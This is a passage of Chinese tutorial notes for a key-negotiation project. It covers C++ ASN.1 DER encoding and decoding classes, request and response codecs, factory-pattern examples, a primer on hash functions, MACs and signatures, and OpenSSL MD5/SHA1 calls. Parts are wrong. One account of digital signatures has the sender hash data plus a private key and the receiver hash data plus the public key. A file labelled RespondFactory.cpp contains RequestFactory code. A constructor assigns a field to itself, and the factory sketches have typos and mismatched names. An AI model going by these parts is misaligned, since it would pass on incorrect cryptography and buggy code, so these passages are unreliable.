NULL; pMidItemData = NULL; pMidValue = NULL; return 0;&#125;//DER编码Null类型数据ITCAST_INT BaseASN1::DER_ItAsn1_WriteNull(ITCAST_ANYBUF **ppDerNull)&#123; ITCAST_ANYBUF *pMidNull = NULL; ITCAST_UINT8 *pMidValue = NULL, *pMidSite, cTag = ITCAST_DER_NULL; //编码 DER_ITASN1_LOW_CREATEUINT8(pMidValue, 2); pMidSite = pMidValue; *(pMidValue++) = cTag; *pMidValue = 0x0; //创建ITCAST_ANYBUF类型结构 DER_CREATE_LOW_ITCAST_ANYBUF(pMidNull); pMidNull-&gt;pData = pMidSite; pMidNull-&gt;dataLen = 2; pMidNull-&gt;dataType = DER_ITASN1_LOW_IDENTIFIER(cTag); //输出 *ppDerNull = pMidNull; //中间变量赋空 pMidNull = NULL; pMidValue = NULL; pMidSite = NULL; return 0;&#125;//DER解码Null类型数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadNull(ITCAST_ANYBUF *pDerNull, ITCAST_UINT8 *pInt)&#123; unsigned char temp[2]; unsigned char derNULL[2]; memcpy(temp, pDerNull-&gt;pData, 1); memcpy(temp + 1, pDerNull-&gt;pData + 1, 1); memset(derNULL, 5, 1); memset(derNULL + 1, 0, 1); if (memcmp(temp, derNULL, 2)) &#123; *pInt = 0; return 1; &#125; *pInt = 5; return 0;&#125;ITCAST_INT BaseASN1::DER_ITCAST_FreeQueue(ITCAST_ANYBUF *pAnyBuf)&#123; ITCAST_ANYBUF * pTmp; pTmp = pAnyBuf; if (pAnyBuf == NULL) &#123; return NoErr; &#125; while (pAnyBuf-&gt;next) &#123; pTmp = pAnyBuf-&gt;next; if (pAnyBuf-&gt;pData) &#123; DER_ITCAST_Free(pAnyBuf-&gt;pData); &#125; DER_ITCAST_Free(pAnyBuf); pAnyBuf = pTmp; &#125; if (pAnyBuf-&gt;pData) &#123; DER_ITCAST_Free(pAnyBuf-&gt;pData); &#125; DER_ITCAST_Free(pAnyBuf); return NoErr;&#125;ITCAST_INT BaseASN1::DER_ITCAST_String_To_AnyBuf(ITCAST_ANYBUF **pOriginBuf, unsigned char *strOrigin, int strOriginLen)&#123; ITCAST_ANYBUF *pValueBuf; pValueBuf = (ITCAST_ANYBUF*)malloc(sizeof(ITCAST_ANYBUF)); if (pValueBuf == NULL) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, MemoryErr, \"malloc err\"); return MemoryErr; &#125; memset(pValueBuf, 0, sizeof(ITCAST_ANYBUF)); if (strOriginLen &lt;= 0) &#123; pValueBuf-&gt;pData = NULL; strOriginLen = 0; &#125; else &#123; pValueBuf-&gt;pData = (unsigned char *)malloc(strOriginLen); if (pValueBuf-&gt;pData == NULL) &#123; DER_ITCAST_Free(pValueBuf); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthErr, \"malloc err\"); return MemoryErr; &#125; memcpy(pValueBuf-&gt;pData, strOrigin, strOriginLen); &#125; pValueBuf-&gt;dataLen = strOriginLen; pValueBuf-&gt;dataType = ITCAST_DER_ID_STRING_PRINTABLE; pValueBuf-&gt;next = NULL; pValueBuf-&gt;prev = NULL; pValueBuf-&gt;unusedBits = (strOriginLen % 8); pValueBuf-&gt;memoryType = 0; *pOriginBuf = pValueBuf; return NoErr;&#125;#define DER_INPUTDATA_ERR 106//对空指针进行编码int BaseASN1::WriteNullSequence(ITCAST_ANYBUF **pOutData)&#123; int rv = 0; ITCAST_ANYBUF *pTmp = NULL, *pHead = NULL; rv = DER_ItAsn1_WriteNull(&amp;pTmp); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, rv, \"func DER_ItAsn1_WriteNull() err\"); return rv; &#125; rv = DER_ItAsn1_WriteSequence(pTmp, &amp;pHead); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); DER_ITCAST_FreeQueue(pHead); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, rv, \"func DER_ItAsn1_WriteSequence() err\"); return rv; &#125; DER_ITCAST_FreeQueue(pTmp); if (pHead == NULL) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, -1, \" check (pHead == NULL) err\"); return -1; &#125; *pOutData = pHead; return 0;&#125;int BaseASN1::EncodeUnsignedChar(unsigned char *pData, int dataLen, ITCAST_ANYBUF **outBuf)&#123; ITCAST_ANYBUF *pHeadBuf = NULL, *pTmp = NULL; int rv; //输入值不合法 if (pData == NULL &amp;&amp; dataLen != 0) &#123; return DER_INPUTDATA_ERR; &#125; //输入值不合法 else if (pData != NULL &amp;&amp; dataLen == 0) &#123; return DER_INPUTDATA_ERR; &#125; else if (pData == NULL &amp;&amp; dataLen == 0) &#123; rv = DER_ITCAST_String_To_AnyBuf(&amp;pTmp, NULL, 0); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return rv; &#125; rv = DER_ItAsn1_WriteBitString(pTmp, &amp;pHeadBuf); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); DER_ITCAST_FreeQueue(pHeadBuf); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return rv; &#125; &#125; else &#123; rv = DER_ITCAST_String_To_AnyBuf(&amp;pTmp, pData, dataLen); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return -1; &#125; rv = DER_ItAsn1_WriteBitString(pTmp, &amp;pHeadBuf); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pHeadBuf); DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return -1; &#125; &#125; DER_ITCAST_FreeQueue(pTmp); *outBuf = pHeadBuf; return 0;&#125;int BaseASN1::DecodeUnsignedChar(ITCAST_ANYBUF *inBuf, unsigned char **Data, int *pDataLen)&#123; ITCAST_ANYBUF *pTmp = NULL; int rv; rv = DER_ItAsn1_ReadBitString(inBuf, &amp;pTmp); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"DecodeUnsignedChar error\"); return -1; &#125; if (pTmp-&gt;dataLen == 0) &#123; DER_ITCAST_FreeQueue(pTmp); *Data = NULL; *pDataLen = 0; return 0; &#125; *Data = (unsigned char*)malloc(pTmp-&gt;dataLen + 1); if (*Data == NULL) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"DecodeUnsignedChar_an Mallco *Data Malloc error\"); return -1; &#125; memset(*Data, 0, pTmp-&gt;dataLen + 1); memcpy(*Data, pTmp-&gt;pData, pTmp-&gt;dataLen); *pDataLen = pTmp-&gt;dataLen; DER_ITCAST_FreeQueue(pTmp); return 0;&#125;int BaseASN1::EncodeChar(char *pData, int dataLen, ITCAST_ANYBUF **outBuf)&#123; ITCAST_ANYBUF *pHeadBuf = NULL, *pTmp = NULL; int rv; //输入值不合法 if (pData == NULL &amp;&amp; dataLen != 0) &#123; return DER_INPUTDATA_ERR; &#125; //输入值不合法 else if (pData != NULL &amp;&amp; dataLen == 0) &#123; return DER_INPUTDATA_ERR; &#125; else if (pData == NULL &amp;&amp; dataLen == 0) &#123; rv = DER_ITCAST_String_To_AnyBuf(&amp;pTmp, NULL, 0); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return -1; &#125; rv = DER_ItAsn1_WritePrintableString(pTmp, &amp;pHeadBuf); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); DER_ITCAST_FreeQueue(pHeadBuf); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return -1; &#125; &#125; else &#123; rv = DER_ITCAST_String_To_AnyBuf(&amp;pTmp, (unsigned char*)pData, dataLen); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return -1; &#125; rv = DER_ItAsn1_WritePrintableString(pTmp, &amp;pHeadBuf); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pHeadBuf); DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"unsigned char*编码 error\"); return -1; &#125; &#125; DER_ITCAST_FreeQueue(pTmp); *outBuf = pHeadBuf; return 0;&#125;int BaseASN1::DecodeChar(ITCAST_ANYBUF *inBuf, char **Data, int *pDataLen)&#123; ITCAST_ANYBUF *pTmp = NULL; int rv; rv = DER_ItAsn1_ReadPrintableString(inBuf, &amp;pTmp); if (rv != 0) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"DecodeUnsignedChar error\"); return -1; &#125; if (pTmp-&gt;dataLen == 0) &#123; DER_ITCAST_FreeQueue(pTmp); *Data = NULL; *pDataLen = 0; return 0; &#125; *Data = (char*)malloc(pTmp-&gt;dataLen + 1); if (*Data == NULL) &#123; DER_ITCAST_FreeQueue(pTmp); //DER_DAPR_DebugMessage(_DEBUG_FILE_,__FILE__,__LINE__,\"DecodeChar_an Mallco *Data Malloc error\"); return -1; &#125; memset(*Data, 0, pTmp-&gt;dataLen + 1); memcpy(*Data, pTmp-&gt;pData, pTmp-&gt;dataLen); *pDataLen = pTmp-&gt;dataLen; DER_ITCAST_FreeQueue(pTmp); return 0;&#125;int BaseASN1::DER_CREATE_LOW_ITCAST_ANYBUF(ITCAST_ANYBUF *&amp;point)&#123; point = (ITCAST_ANYBUF *)malloc(sizeof(ITCAST_ANYBUF)); if (point == NULL) &#123; return 7002; &#125; memset(point, 0, sizeof(ITCAST_ANYBUF)); point-&gt;dataLen = 0; point-&gt;dataType = 0; point-&gt;memoryType = MallocMemory; point-&gt;pData = NULL; point-&gt;unusedBits = 0; point-&gt;next = NULL; point-&gt;prev = NULL; return 0;&#125; SequenceASN1类是对BaseASN1进行二次封装,变得更容易使用 SequenceASN1.h 123456789101112131415161718192021222324252627282930313233343536373839#ifndef ASN1DER_H#define ASN1DER_H#include &quot;BaseASN1.h&quot;#include &lt;string&gt;class SequenceASN1 : public BaseASN1&#123;public: SequenceASN1(); // 添加头结点 int writeHeadNode(int iValue); int writeHeadNode(char* sValue, int len); // 添加后继结点 int writeNextNode(int iValue); int writeNextNode(char* sValue, int len); // 读头结点数据 int readHeadNode(int &amp;iValue); int readHeadNode(char* sValue); // 读后继结点数据 int readNextNode(int &amp;iValue); int readNextNode(char* sValue); // 打包链表 int packSequence(char** outData, int &amp;outLen); // 解包链表 int unpackSequence(char* inData, int inLen); // 释放链表 void freeSequence(ITCAST_ANYBUF* node = NULL);private: ITCAST_ANYBUF* m_header = NULL; ITCAST_ANYBUF* m_next = NULL; ITCAST_ANYBUF* m_temp = NULL;&#125;;#endif // ASN1DER_H SequenceASN1.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include \"SequenceASN1.h\"SequenceASN1::SequenceASN1()&#123;&#125;int SequenceASN1::writeHeadNode(int iValue)&#123; DER_ItAsn1_WriteInteger(iValue, &amp;m_header); m_next = m_header; return 0;&#125;int SequenceASN1::writeHeadNode(char * sValue, int len)&#123; EncodeChar(sValue, len, &amp;m_header); m_next = m_header; return 0;&#125;int SequenceASN1::writeNextNode(int iValue)&#123; DER_ItAsn1_WriteInteger(iValue, &amp;m_next-&gt;next); m_next = m_next-&gt;next; return 0;&#125;int SequenceASN1::writeNextNode(char * sValue, int len)&#123; EncodeChar(sValue, len, &amp;m_next-&gt;next); m_next = m_next-&gt;next; return 0;&#125;int SequenceASN1::readHeadNode(int &amp; iValue)&#123; DER_ItAsn1_ReadInteger(m_header, (ITCAST_UINT32 *)&amp;iValue); m_next = m_header-&gt;next; return 0;&#125;int SequenceASN1::readHeadNode(char * sValue)&#123; DER_ItAsn1_ReadPrintableString(m_header, &amp;m_temp); memcpy(sValue, m_temp-&gt;pData, m_temp-&gt;dataLen); DER_ITCAST_FreeQueue(m_temp); m_next = m_header-&gt;next; return 0;&#125;int SequenceASN1::readNextNode(int &amp; iValue)&#123; DER_ItAsn1_ReadInteger(m_next, (ITCAST_UINT32 *)&amp;iValue); m_next = m_next-&gt;next; return 0;&#125;int SequenceASN1::readNextNode(char * sValue)&#123; DER_ItAsn1_ReadPrintableString(m_next, &amp;m_temp); memcpy(sValue, m_temp-&gt;pData, m_temp-&gt;dataLen); DER_ITCAST_FreeQueue(m_temp); m_next = m_next-&gt;next; return 0;&#125;int SequenceASN1::packSequence(char ** outData, int &amp; outLen)&#123; DER_ItAsn1_WriteSequence(m_header, &amp;m_temp); //传输参数赋值 *outData = (char *)m_temp-&gt;pData; outLen = m_temp-&gt;dataLen; //释放整个链表 DER_ITCAST_FreeQueue(m_header); return 0;&#125;int SequenceASN1::unpackSequence(char * inData, int inLen)&#123; DER_ITCAST_String_To_AnyBuf(&amp;m_temp, (unsigned char *)inData, inLen); DER_ItAsn1_ReadSequence(m_temp, &amp;m_header); DER_ITCAST_FreeQueue(m_temp); return 0;&#125;void SequenceASN1::freeSequence(ITCAST_ANYBUF * node)&#123;&#125; 业务逻辑类 业务逻辑类父类 使用多态的方式去调用子类的具体业务方法 Codec.h 123456789101112131415#pragma once#include &quot;SequenceASN1.h&quot;// 编解码的父类class Codec : public SequenceASN1&#123;public: Codec(); virtual ~Codec(); // 数据编码 virtual int msgEncode(char** outData, int &amp;len); // 数据解码 virtual void* msgDecode(char *inData, int inLen);&#125;; Codec.cpp 12345678910111213141516171819#include &quot;Codec.h&quot;Codec::Codec()&#123;&#125;Codec::~Codec()&#123;&#125;int Codec::msgEncode(char ** outData, int &amp; len)&#123; return 0;&#125;void * Codec::msgDecode(char * inData, int inLen)&#123; return NULL;&#125; 业务逻辑子类 RespondCodec.h 123456789101112131415161718192021222324252627282930313233343536#pragma once#include &quot;Codec.h&quot;struct RespondMsg&#123; int rv; // 返回值 char clientId[12]; // 客户端编号 char serverId[12]; // 服务器编号 char r2[64]; // 服务器端随机数 int seckeyid; // 对称密钥编号 keysn RespondMsg() &#123;&#125; RespondMsg(char* clientID, char* serverID, char* r2, int rv, int seckeyID) &#123; this-&gt;rv = rv; this-&gt;seckeyid = seckeyid; strcpy(this-&gt;clientId, clientID); strcpy(this-&gt;serverId, serverID); strcpy(this-&gt;r2, r2); &#125;&#125;;class RespondCodec : public Codec&#123;public: RespondCodec(); RespondCodec(RespondMsg *msg); ~RespondCodec(); // 函数重载 int msgEncode(char** outData, int &amp;len); void* msgDecode(char *inData, int inLen); private: RespondMsg m_msg;&#125;; RequestCodec.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include \"RequestCodec.h\"#include &lt;iostream&gt;using namespace std;//解码的时候使用RequestCodec::RequestCodec() : Codec()&#123;&#125;//编码的时候调用RequestCodec::RequestCodec(RequestMsg * msg)&#123; // 赋值操作 memcpy(&amp;m_msg, msg, sizeof(RequestMsg));&#125;RequestCodec::~RequestCodec()&#123;&#125;/* struct RequestMsg &#123; //1 密钥协商 //2 密钥校验; // 3 密钥注销 int cmdType; // 报文类型 char clientId[12]; // 客户端编号 char authCode[65]; // 认证码 char serverId[12]; // 服务器端编号 char r1[64]; // 客户端随机数 &#125;;*/int RequestCodec::msgEncode(char ** outData, int &amp; len)&#123; writeHeadNode(m_msg.cmdType); writeNextNode(m_msg.clientId, strlen(m_msg.clientId)+1); writeNextNode(m_msg.authCode, strlen(m_msg.authCode) + 1); writeNextNode(m_msg.serverId, strlen(m_msg.serverId) + 1); writeNextNode(m_msg.r1, strlen(m_msg.r1) + 1); packSequence(outData, len); return 0;&#125;void * RequestCodec::msgDecode(char * inData, int inLen)&#123; //反序列化 unpackSequence(inData, inLen); readHeadNode(m_msg.cmdType); readNextNode(m_msg.clientId); readNextNode(m_msg.authCode); readNextNode(m_msg.serverId); readNextNode(m_msg.r1); cout &lt;&lt; \"解码成功\" &lt;&lt; endl; return &amp;m_msg;&#125; 工厂模式 简单工厂模式 - 只需要一个工厂类 工厂: 使用一个单独的类来做创建实例的过程, 这就是工厂。 简单工厂：把对象的创建放到一个工厂类中，通过参数来创建不同的对象。 特点： 缺点：每添一个对象，就需要对简单工厂进行修改（尽管不是删代码，仅仅是添一个switch case，但仍 然违背了“不改代码”的原则, 尽量做到添加代码而不是修改原有代码） 优点：去除了与具体产品的依赖。 使用流程 创建一类, 用于生产对象, 这个类就是工厂类 在这个类中添加一工厂函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445class A : pulbic C&#123;&#125;class B : pulbic C&#123;&#125;class C&#123;&#125;class Factory&#123;public: Factory()&#123; &#125; Factory(int flag)&#123; m_flag = flag &#125; C * CreateObject()&#123; switch(m_flag)&#123; case 1: return new A; break; case 2: return new B; break; default: break; &#125; &#125;private: int m_flag; &#125; 工厂模式 - 需要有N个工厂类 工厂方法：每种产品由一种工厂来创建, 不同工厂创建不同的对象 特点：基本完美，完全遵循 “不改代码”的原则 创建一个工厂类 - 基类 在基类的工厂类中添加工厂函数, 这是一个虚函数 根据要创建的子对象添加子工厂类, 每个子对象的创建都对应一个子工厂类 在子工厂类中实现父类的工厂函数, 完成创建对象的操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 创建的子对象class RequestCodec&#123;&#125;;class RespondCodec&#123;&#125;;class Factory&#123;public: Factory(); ~Factory(); // 工厂函数 // 创建RequestCodec对象 // 创建RespondCodec对象 // flag == 0 创建RequestCodec对象 // flag == 1 创建RespondCodec对象 virtual Codec* createFactory(int flag) = 0;&#125;;// 创建子工厂类1class RequestFactory : public Factory&#123;public: RequestFactory() &#123; flag = 0; &#125; RequestFactory(RequestMsg* msg) &#123; m_request = msg; flag = 1; &#125; ~RequestFactory(); // 只创建RequestCodec对象 Codec* createFactory() &#123; if(flag) return new RequestCodec(&amp;msg); else return new RequestCodec(); &#125;private: RequestMsg *m_request; bool flag;&#125;;// 创建子工厂类2class RespondFactory : public Factory&#123;public: RequestFactory(); ~RequestFactory(); // 只创建RespondCodec对象 Codec* createFactory() &#123; return new RespondCodec(); &#125;&#125; RespondFactory.h 123456789101112131415161718#pragma once#include \"CodecFactory.h\"#include \"RespondCodec.h\"class RespondFactory : public CodecFactory&#123;public: RespondFactory(); RespondFactory(RespondMsg *msg); ~RespondFactory(); Codec* createCodec();private: bool m_flag; RespondMsg * m_respond;&#125;; RespondFactory.cpp 123456789101112131415161718192021222324252627282930#include \"RequestFactory.h\"RequestFactory::RequestFactory()&#123; m_flag = false;&#125;RequestFactory::RequestFactory(RequestMsg * msg)&#123; m_request = msg; m_flag = true;&#125;RequestFactory::~RequestFactory()&#123;&#125;Codec * RequestFactory::createCodec()&#123; if (m_flag == true) &#123; //用于编码的类对象 return new RequestCodec(m_request); &#125; else &#123; //用于解码的类对象 return new RequestCodec(); &#125;&#125; CodecFactory.h 1234567891011#pragma once#include \"Codec.h\"class CodecFactory&#123;public: CodecFactory(); virtual ~CodecFactory(); virtual Codec* createCodec();&#125;; CodecFactory.cpp 1234567891011121314#include \"CodecFactory.h\"CodecFactory::CodecFactory()&#123;&#125;CodecFactory::~CodecFactory()&#123;&#125;Codec * CodecFactory::createCodec()&#123; return NULL;&#125; main.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;iostream&gt;#include \"RequestCodec.h\"#include \"CodecFactory.h\"#include \"RequestFactory.h\"using namespace std;int main()&#123;#if 1 // 编码 RequestMsg req; req.cmdType = 100; strcpy(req.clientId, \"hello\"); strcpy(req.authCode, \"1111\"); strcpy(req.serverId, \"22222\"); strcpy(req.r1, \"abcdefg\"); char* outData; int len; //使用工厂类构造编解码对象 //1-new子工厂类对象 CodecFactory *factory = new RequestFactory(&amp;req); Codec *codec = factory-&gt;createCodec(); codec-&gt;msgEncode(&amp;outData, len); delete factory; delete codec; RequestMsg* tmp; factory = new RequestFactory(); codec = factory-&gt;createCodec(); tmp = (RequestMsg *)codec-&gt;msgDecode(outData, len); cout &lt;&lt; \"cmdtype: \" &lt;&lt; tmp-&gt;cmdType &lt;&lt; endl; cout &lt;&lt; \"serverID: \" &lt;&lt; tmp-&gt;serverId &lt;&lt; endl; cout &lt;&lt; \"clientID: \" &lt;&lt; tmp-&gt;clientId &lt;&lt; endl; cout &lt;&lt; \"r1: \" &lt;&lt; tmp-&gt;r1 &lt;&lt; endl;#endif#if 0//测试RequestCodec类 // 编码 RequestMsg req; req.cmdType = 100; strcpy(req.clientId, \"hello\"); strcpy(req.authCode, \"1111\"); strcpy(req.serverId, \"22222\"); strcpy(req.r1, \"abcdefg\"); Codec* codec = new RequestCodec(&amp;req); // 调用编码函数 char* outData; int len; codec-&gt;msgEncode(&amp;outData, len); // ======================== // 解码 codec = new RequestCodec(); RequestMsg* tmp = (RequestMsg*)codec-&gt;msgDecode(outData, len); cout &lt;&lt; \"cmdtype: \" &lt;&lt; tmp-&gt;cmdType &lt;&lt; endl; cout &lt;&lt; \"serverID: \" &lt;&lt; tmp-&gt;serverId &lt;&lt; endl; cout &lt;&lt; \"clientID: \" &lt;&lt; tmp-&gt;clientId &lt;&lt; endl; cout &lt;&lt; \"r1: \" &lt;&lt; tmp-&gt;r1 &lt;&lt; endl;#endif return 0;&#125; 单向散列函数（哈希函数） 概念 单向散列函数（one-wayftnction）有一个输入和一个输出，其中输入称为消息（message），输出称 为散列值（hashvalue）。单向散列函数可以根据消息的内容计算出散列值，而散列值就可以被用来检 查消息的完整性。 单向散列函数也称为消息摘要函数（message digest function）、哈希函数或者杂凑函数。 单向散列函数输出的散列值也称为消息摘要（message digest）或者指纹（fifingerprint）。 完整性也称为一致性。 压缩性 任意长度的数据，算出的值长度都是固定的。 容易计算 计算散列值所花费的时间必须要短。尽管消息越长，计算散列值的时间也会越长，但如果不能在现实的时间内完成计算就没有意义了。 抗修改性 对原数据进行任何改动，哪怕只修改1个字节，所得到的值都有很大区别 强抗碰撞性 已知原数据和其哈希值，想找到一个具有相同哈希值的数据（即伪造数据）是非常困难的。 单向性（不可逆） 哈希函数的应用 检测软件是否被篡改 我们可以使用单向散列函数来确认自己下载的软件是否被篡改。 很多软件，尤其是安全相关的软件都会把通过单向散列函数计算出的散列值公布在自己的官方网站上。 用户在下载到软件之后，可以自行计算散列值，然后与官方网站上公布的散列值进行对比。通过散列 值，用户可以确认自己所下载到的文件与软件作者所提供的文件是否一致。 这样的方法，在可以通过多种途径得到软件的情况下非常有用。为了减轻服务器的压力，很多软件作者 都会借助多个网站（镜像站点）来发布软件，在这种情况下，单向散列函数就会在检测软件是否被篡改 方面发挥重要作用。 消息认证码 使用单向散列函数可以构造消息认证码。 消息认证码是将“发送者和接收者之间的共享密钥”和“消息，进行混合后计算出的散列值。使用消息认证 码可以检测并防止通信过程中的错误、篡改以及伪装。 对于发送端tom: 将要发送的数据进行哈希运算, 参与运算的数据是: 原始数据+秘钥, 可以得到一个散列值 将散列值与原始数据进行拼接, 一起发送给对方; 对于接收端: 接收对方发来的数据, 并将原始数据和散列值拆分开, 得到散列值和原始数据 对原始数据进行哈希运算: 参与运算的数据也是:原始数据+秘钥, 可以得到一个散列值 将计算得到的散列值与接受到的散列值进行比较, 相同则认为没有被篡改, 否则认为被篡改了. 注意: 发送方和接受方使用的秘钥是同一个秘钥(对称秘钥,秘钥分发困难), 这个秘钥只有发送方和接受方知道,若这个秘钥被第三方知道了, 就没有办法保证数据的是安全的了 数字签名 在进行数字签名时也会使用单向散列函数。 数字签名是现实社会中的签名（sign）和盖章这样的行为在数字世界中的实现。数字签名的处理过程非 常耗时，因此一般不会对整个消息内容直接施加数字签名，而是先通过单向散列函数计算出消息的散列 值，然后再对这个散列值施加数字签名。 使用的是非对称加密, 有公钥和私钥 A给B发送数据: A先将公钥发送给B 将发送的数据+私钥进行哈希运算, 得到一个散列值 将原数据+散列值拼接一起发送给对方B B收到数据之后, 将数据进行拆分成原数据和散列值 B也对原数据+公钥进行哈希运算, 得到散列值 B将自己计算出的散列值与A发送来的散列值进行比较: 相同, 认为数据没有被篡改 不相同, 认为数据篡改过. 数字签名: A将明文进行哈希运算得到一个散列值, 并且用私钥对哈希值进行加密, 然后将明文和加了密的哈希 值一起发送给B; B收到之后, 使用公钥对哈希值进行解密, 得到原始的哈希值, 并且对明文进行哈希运算也得到一个哈希值, 最后 对自己生成的哈希值和A发送过来的哈希值进行比较, 如果一样, 则认为没有被篡改. 使用数字签名的目的是为了不可抵赖性.(表明拿私钥的一方发送的数据, 是不可抵赖的) 一次性口令或登录验证 使用单向散列函数可以构造一次性口令（one-time password）。 一次性口令经常被用于服务器对客户端的合法性认证。在这种方式中，通过使用单向散列函数可以保证 口令只在通信链路上传送一次（one-time），因此即使窃听者窃取了口令，也无法使用。 当用户登录的时候, 需要输入密码, 这个密码会经过加密运算, 经过运算之后的值再与服务器中保存的密 码进行比较, 若相同则输入密码正确, 允许登录. 若用户忘记密码, 则只能重置密码, 服务端并不知道用户原来的明文, 只能是重新设置. 常用的哈希函数 1. Md4、Md5 MD4是由Rivest于1990年设计的单向散列函数，能够产生128比特的散列值（RFC1186，修订版 RFC1320）。不过，随着Dobbertin提出寻找MD4散列碰撞的方法，因此现在它已经不安全了。 MD5是由Rwest于1991年设计的单项散列函数，能够产生128比特的散列值（RFC1321）。 MD5的强抗碰撞性已经被攻破，也就是说，现在已经能够产生具备相同散列值的两条不同的消息，因此 它也已经不安全了。 MD4和MD5中的MD是消息摘要（Message Digest）的缩写。 2. SHA-1、SHA-256、SHA-384、SHA-512 SHA-1是由NIST（National Institute Of Standardsand Technology，美国国家标准技术研究所）设计 的一种能够产生160比特的散列值的单向散列函数。1993年被作为美国联邦信息处理标准规格 （FIPS PUB 180）发布的是SHA,1995年发布的修订版FIPS PUB 180-1称为SHA-1。 SHA-1的消息长度存在上限，但这个值接近于264比特，是个非常巨大的数值，因此在实际应用中没 有问题。 SHA-256、SHA-384和SHA-512都是由NIST设计的单向散列函数，它们的散列值长度分别为256比特 、384比特和512比特。这些单向散列函数合起来统称SHA-2，它们的消息长度也存在上限 （SHA-256的上限接近于 264 比特，SHA-384 和 SHA-512的上限接近于 2128 比特）。这些单向 散列函数是于2002年和 SHA-1 一起作为 FIPS PUB 180-2发布的 SHA-1 的强抗碰撞性已于2005年被攻 破, 也就是说，现在已经能够产生具备相同散列值的两条不同的消息。不过，SHA-2还尚未被攻破。 最终需要对得到的散列值做转换, 以16进制格式的字符串表示 1234567891011121314151617181920212223242526272829303132333435363738394041// 第一种方式// 初始化一个MD5_CTX类型的变量int MD5_Init(MD5_CTX *c);- c: 传出// 给哈希函数添加要运算的数据int MD5_Update(MD5_CTX *c, const void *data, size_t len);- C: 传入- data: 传入, 要进行哈希运算的数据- len: data参数的长度文件1Gwhile(read(fd, buf, len))&#123; MD5_Update(c, buf, buflen);&#125;// 计算结果int MD5_Final(unsigned char *md, MD5_CTX *c);- md传出参数, 需要将计算出的散列值保存到md中- c: 出入//=========================================// 第二种方式unsigned char *MD5(const unsigned char *d, size_t n, unsigned char *md);- d: 要进行哈希运算的字符串- n: 第一个参数的长度- md: 计算出的散列值返回值: 得到的散列值//===========================================================================int SHA1_Init(SHA_CTX *c);int SHA1_Update(SHA_CTX *c, const void *data, size_t len);int SHA1_Final(unsigned char *md, SHA_CTX *c);unsigned char *SHA1(const unsigned char *d, size_t n, unsigned char *md);上述几个函数的用法同md5的几个函数. 相关的函数说明可以在openssl安装目录中去查看: C:\\OpenSSL-Win32\\include\\openssl, 如md5.h和sha.h 能够用到的库名: libssl.lib libcrypto.lib 使用到的库所在的路径: C:\\OpenSSL-Win32\\lib 使用到的头文件所在的路径: C:\\OpenSSL-Win32\\include 注意: 在使用vs进行项目开发的时候, 需要指定头文件所在路径和库文件所在路径 ItcastLog.h 123456789101112131415161718192021222324252627282930313233#ifndef _ITCAST_LOG_H_#define _ITCAST_LOG_H_#include &lt;cstdarg&gt;/************************************************************************//* const char *file：文件名称int line：文件行号int level：错误级别 0 -- 没有日志 1 -- debug级别 2 -- info级别 3 -- warning级别 4 -- err级别int status：错误码const char *fmt：可变参数*//************************************************************************/// 日志类class ItcastLog&#123;public: enum LogLevel&#123;NOLOG, DEBUG, INFO, WARNING, ERROR&#125;; void Log(const char *file, int line, int level, int status, const char *fmt, ...); ItcastLog(); ~ItcastLog();private: int ITCAST_Error_GetCurTime(char* strTime); int ITCAST_Error_OpenFile(int* pf); void ITCAST_Error_Core(const char *file, int line, int level, int status, const char *fmt, va_list args);&#125;;#endif ItcastLog.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdarg.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;//#include &lt;unistd.h&gt;#include \"ItcastLog.h\"#include &lt;string&gt;using namespace std;const string ITCAST_DEBUG_FILE = \"itderlog.log\";const int ITCAST_MAX_STRING_LEN = 10240;//Level的名称const string 